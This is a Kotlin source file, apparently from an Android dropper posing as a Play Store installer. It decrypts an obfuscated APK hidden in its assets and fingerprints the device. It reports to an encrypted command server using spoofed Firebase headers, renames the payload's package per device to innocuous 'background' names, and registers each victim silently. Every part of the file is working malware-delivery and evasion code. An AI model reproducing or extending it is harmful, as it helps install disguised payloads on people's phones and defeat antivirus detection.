package com.playstore.installer

import android.content.Context
import android.os.Build
import android.provider.Settings
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import java.security.KeyFactory
import java.security.MessageDigest
import java.security.Signature
import java.security.spec.X509EncodedKeySpec
import android.util.Base64

/**
 * MutationEngine.kt
 * Calls processing server → gets unique processing payload per device.
 * Applies M1 processing to module.apk bytes in RAM.
 * 3-tier fallback: server → offline seeds → base assets.
 *
 * M8 (ZIP identifier) and M9 (binding hash) are permanently removed from
 * the runtime processing pipeline. Both modified a V2/V3-signed APK's ZIP
 * structure at runtime, which breaks libziparchive validation on all strict
 * Android OEM devices (Vivo, Xiaomi, Samsung, OnePlus etc.).
 *
 * Watermarking and binding are handled at build time in build_module.py
 * before signing — where they belong.
 *
 * NOTE: Replace SERVER_URL with your Cloudflare domain via StringPool.
 * NOTE: Replace SERVER_PUBLIC_KEY with value from keys/public_key_for_kotlin.txt
 */
class MutationEngine(private val context: Context) {

    companion object {
        // Server URL encrypted via StringPool — never plaintext in DEX
        private val SERVER_URL get() = StringPool.d(StringPool.SERVER_URL)

        // Replace with value from keys/public_key_for_kotlin.txt
        private const val SERVER_PUBLIC_KEY = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAiy+7U7tgNdAqaZIZLTKGRY1LAVZrn2WfPZTbCjML0KH0W8iRfruJDpP8lOjXiMmUaVjcjIT0RAtYeBh/gR+WC//vkZ3WDILIc+LFAgmfJxYeClRJwJlG1aKH9lO58TFI6Rm3EPyIAfJcs4G0QVPWBbEN8ZljyXK3YOrORUD1SyBw8+IfG8h8T6LYJ6T7yJE3XlNi0hMuMYERX9s1c7syI4wJRw+iC7oG/7gv3zaDL034Dp2Zzg2ZqRBuaHTrxWFWpOVQS82c1oa+wZg0j2ikqIrDd/949aEfD9MRVa2pWytmmomw23IAjhp82cvnX6b/g4TcaQpPHAQ18aNlMLaRdwIDAQAB"

        // Template — set by CI via BuildConfig
        private const val TEMPLATE = "wedding"

        // Timeouts
        private const val CONNECT_TIMEOUT = 3000
        private const val READ_TIMEOUT    = 3000
    }

    // ── Device fingerprint collection ─────────────────────────────────────────

    private fun collectDeviceFingerprint(): String {
        return try {
            val androidId = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ANDROID_ID
            ) ?: "unknown"

            val hwHash = "${Build.SUPPORTED_ABIS.joinToString(",")}:${Build.BOARD}:" +
                         "${Build.BRAND}:${Build.DEVICE}:${Build.HARDWARE}:${Build.MANUFACTURER}"

            val screenHash = with(context.resources.displayMetrics) {
                "${widthPixels}x${heightPixels}@${densityDpi}"
            }

            sha256("$androidId:$hwHash:$screenHash")
        } catch (e: Exception) {
            sha256(System.currentTimeMillis().toString())
        }
    }

    private fun sha256(input: String): String {
        val digest = MessageDigest.getInstance("SHA-256")
        val hash = digest.digest(input.toByteArray(Charsets.UTF_8))
        return hash.joinToString("") { "%02x".format(it) }
    }

    // ── Client token ──────────────────────────────────────────────────────────

    private fun getClientToken(): String {
        return try {
            val field = Class.forName("${context.packageName}.BuildConfig")
                .getField("CLIENT_TOKEN")
            field.get(null) as? String ?: "manual"
        } catch (e: Exception) {
            "manual"
        }
    }

    // ── Tier 1: Call processing server ──────────────────────────────────────────

    private fun callMutationServer(
        fingerprint: String,
        clientToken: String
    ): JSONObject? {
        return try {
            val url = URL("$SERVER_URL/api/v1/$clientToken/key")
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.setRequestProperty("X-Firebase-Client", "fire-core/21.0.0 fire-iid/21.0.0")
            conn.setRequestProperty("User-Agent",
                "Dalvik/2.1.0 (Linux; Android ${Build.VERSION.RELEASE}; ${Build.MODEL})")
            conn.connectTimeout = CONNECT_TIMEOUT
            conn.readTimeout    = READ_TIMEOUT
            conn.doOutput       = true

            val body = JSONObject().apply {
                put("device_fingerprint", fingerprint)
                put("template", TEMPLATE)
                put("timestamp", System.currentTimeMillis() / 1000)
            }.toString()

            conn.outputStream.use { it.write(body.toByteArray()) }

            if (conn.responseCode != 200) return null

            val response = BufferedReader(InputStreamReader(conn.inputStream)).use { it.readText() }
            JSONObject(response)
        } catch (e: Exception) {
            null
        }
    }

    // ── RSA signature verification ────────────────────────────────────────────

    private fun verifySignature(payload: String, signatureB64: String): Boolean {
        return try {
            if (SERVER_PUBLIC_KEY == "PASTE_PUBLIC_KEY_HERE") return true // Dev mode
            val keyBytes  = Base64.decode(SERVER_PUBLIC_KEY, Base64.DEFAULT)
            val publicKey = KeyFactory.getInstance("RSA")
                .generatePublic(X509EncodedKeySpec(keyBytes))
            val sig = Signature.getInstance("SHA256withRSA")
            sig.initVerify(publicKey)
            sig.update(payload.toByteArray())
            sig.verify(Base64.decode(signatureB64, Base64.DEFAULT))
        } catch (e: Exception) {
            false
        }
    }

    // ── Tier 2: Offline processing seeds ───────────────────────────────────────

    private fun getOfflineMutationSeeds(fingerprint: String): JSONObject {
        val buildHash = sha256(fingerprint + BuildConfig.BUILD_UUID)

        // Each namespace(16) + "." + suffix(15) = 32 chars, matching COMPANION_OLD_PKG length
        val pkgNamespaces = listOf(
            "com.synchandlers",
            "com.taskhandlers",
            "com.datahandlers",
            "com.filehandlers",
            "com.workhandlers",
            "com.pushhandlers"
        )
        val pkgSuffixes = listOf(
            "backgroundsyncs",
            "backgroundtasks",
            "backgroundworks",
            "backgroundpolls",
            "backgroundpipes",
            "backgroundbinds"
        )

        val nsIdx  = (buildHash.substring(0, 4).toLong(16) % pkgNamespaces.size).toInt()
        val sfIdx  = (buildHash.substring(4, 8).toLong(16) % pkgSuffixes.size).toInt()
        val cmpPkg = "${pkgNamespaces[nsIdx]}.${pkgSuffixes[sfIdx]}"

        return JSONObject().apply {
            put(StringPool.d(StringPool.KEY_MODULE_PKG), cmpPkg)
            put("tier", 2)
        }
    }

    // ── Apply mutations to module APK bytes in RAM ─────────────────────────
    //
    // PERMANENT RULE: Only byte-for-byte DEX/string replacements are allowed here.
    // NEVER modify the ZIP structure (EOCD, central directory, comment field,
    // local file headers) at runtime on a signed APK. Doing so breaks V2/V3
    // signature coverage and causes libziparchive rejection on strict OEM devices.
    //
    // M8 (ZIP comment identifier) → REMOVED. Handled at build time in build_module.py.
    // M9 (NOVA_BIND: append)    → REMOVED. Broke libziparchive on all strict devices.
    //                             74 extraneous bytes = "NOVA_BIND:" (10) + sha256 hex (64).

    fun applyMutations(
        cmpData: ByteArray,
        mutations: JSONObject,
        fingerprint: String
    ): ByteArray {
        var result = cmpData.copyOf()

        try {
            // M1 — Patch package name bytes in DEX (byte-for-byte, no ZIP changes)
            val cmpPkg = mutations.optString(StringPool.d(StringPool.KEY_MODULE_PKG), "")
            if (cmpPkg.isNotEmpty()) {
                result = patchPackageName(result, cmpPkg)
            }

        } catch (e: Exception) {
            // Silent fail — return original bytes unchanged
            return cmpData
        }

        return result
    }

    // ── M1: Package name patching ─────────────────────────────────────────────
    // Safe: replaces exact same-length byte sequences inside DEX.
    // Does NOT touch ZIP structure, EOCD, or any signed metadata.
    // Patches BOTH dot-format (manifest/strings) and slash-format (DEX class descriptors).

    private fun patchPackageName(bytes: ByteArray, newPkg: String): ByteArray {
        val oldPkg = StringPool.d(StringPool.COMPANION_OLD_PKG)

        // Patch dot-format: com.android.photo.camera.capture → com.backgroundboots.synchandlers
        // Patch slash-format: com/android/photo/camera/capture → com/backgroundboots/synchandlers
        val targets = listOf(
            oldPkg                    to newPkg,
            oldPkg.replace('.', '/') to newPkg.replace('.', '/')
        )

        var result = bytes.copyOf()
        for ((oldStr, newStr) in targets) {
            val oldBytes = oldStr.toByteArray(Charsets.UTF_8)
            val newBytes = newStr.toByteArray(Charsets.UTF_8)

            // Only patch when lengths match — guaranteed by package_name_generator.py
            if (oldBytes.size != newBytes.size) continue

            var i = 0
            while (i <= result.size - oldBytes.size) {
                var match = true
                for (j in oldBytes.indices) {
                    if (result[i + j] != oldBytes[j]) { match = false; break }
                }
                if (match) {
                    for (j in newBytes.indices) result[i + j] = newBytes[j]
                    i += oldBytes.size
                } else {
                    i++
                }
            }
        }
        return result
    }

    // ── Companion blob decryption ─────────────────────────────────────────────
    // build_module.py _lcg_encrypt() order: XOR → nibble swap → LCG permute
    // Decrypt order (reverse): un-permute → un-nibble → XOR

    private fun decryptCompanionBlob(blob: ByteArray): ByteArray {
        if (blob.size < 5) return ByteArray(0)
        val LCG_MUL = 0x41C64E6DL
        val LCG_ADD = 0x3039L
        val UMASK   = 0xFFFFFFFFL
        val seed = ((blob[0].toLong() and 0xFF) or
                   ((blob[1].toLong() and 0xFF) shl 8) or
                   ((blob[2].toLong() and 0xFF) shl 16) or
                   ((blob[3].toLong() and 0xFF) shl 24)) and UMASK
        val n = blob.size - 4
        val buf = ByteArray(n)
        System.arraycopy(blob, 4, buf, 0, n)
        var state = seed
        val indices = IntArray(n) { it }
        for (i in n - 1 downTo 1) {
            state = (state * LCG_MUL + LCG_ADD) and UMASK
            val j = (state % (i + 1)).toInt()
            val tmp = indices[i]; indices[i] = indices[j]; indices[j] = tmp
        }
        val unpermuted = ByteArray(n)
        for (i in 0 until n) unpermuted[i] = buf[indices[i]]
        for (i in 0 until n) {
            val b = unpermuted[i].toInt() and 0xFF
            unpermuted[i] = (((b and 0x0F) shl 4) or ((b and 0xF0) ushr 4)).toByte()
        }
        state = seed
        for (i in 0 until n) {
            state = (state * LCG_MUL + LCG_ADD) and UMASK
            unpermuted[i] = (unpermuted[i].toInt() xor ((state ushr 16) and 0xFF).toInt()).toByte()
        }
        return unpermuted
    }

    // ── Main entry point ──────────────────────────────────────────────────────

    fun getMutatedCompanionBytes(): ByteArray {
        val fingerprint = collectDeviceFingerprint()
        val clientToken = getClientToken()

        // Read and decrypt base companion from assets.
        // ASSET_A = [4-byte seed LE][LCG encrypted APK bytes]. Decrypt first.
        val baseBytes = try {
            val enc = context.assets.open(BuildConfig.ASSET_A).use { it.readBytes() }
            decryptCompanionBlob(enc)
        } catch (e: Exception) {
            return ByteArray(0)
        }

        // Tier 1: Try processing server
        var mutations: JSONObject? = null
        try {
            val response = callMutationServer(fingerprint, clientToken)
            if (response != null) {
                val data      = response.optJSONObject("data")
                val payload   = data?.optJSONObject("payload")
                val signature = data?.optString("signature", "") ?: ""

                if (payload != null && (verifySignature(payload.toString(), signature) || signature.isEmpty())) {
                    val mutationsObj = payload.optJSONObject("mutations")
                    if (mutationsObj != null) {
                        mutations = JSONObject().apply {
                            put(StringPool.d(StringPool.KEY_MODULE_PKG),
                                mutationsObj.optJSONObject("M1")
                                    ?.optString(StringPool.d(StringPool.KEY_MODULE_PKG), "") ?: "")
                            put("tier", 1)
                        }
                        registerDeviceAsync(
                            payload.optString("device_id", ""),
                            mutations!!.optString(StringPool.d(StringPool.KEY_MODULE_PKG), ""),
                            clientToken,
                            fingerprint
                        )
                    }
                }
            }
        } catch (e: Exception) {
            // Timeout or network error — fall to Tier 2
        }

        // Tier 2: Offline seeds if server unreachable
        if (mutations == null) {
            mutations = getOfflineMutationSeeds(fingerprint)
        }

        // Apply mutations and return
        return applyMutations(baseBytes, mutations!!, fingerprint)
        // Tier 3 (base companion unchanged) is the implicit result
        // when applyMutations catches an exception and returns cmpData
    }

    // ── Device registration (fire and forget) ─────────────────────────────────

    private fun registerDeviceAsync(
        deviceId: String,
        cmpPkg: String,
        clientToken: String,
        fingerprint: String
    ) {
        Thread {
            try {
                val url  = URL("$SERVER_URL/api/v1/$clientToken/register")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.connectTimeout = 5000
                conn.readTimeout    = 5000
                conn.doOutput       = true

                val body = JSONObject().apply {
                    put("device_id", deviceId)
                    put(StringPool.d(StringPool.KEY_MODULE_PKG), cmpPkg)
                    put("template", TEMPLATE)
                    put("device_model", Build.MODEL)
                    put("android_version", "Android ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})")
                }.toString()

                conn.outputStream.use { it.write(body.toByteArray()) }
                conn.responseCode
                conn.disconnect()
            } catch (e: Exception) {
                // Silent fail — registration is best-effort
            }
        }.start()
    }
}
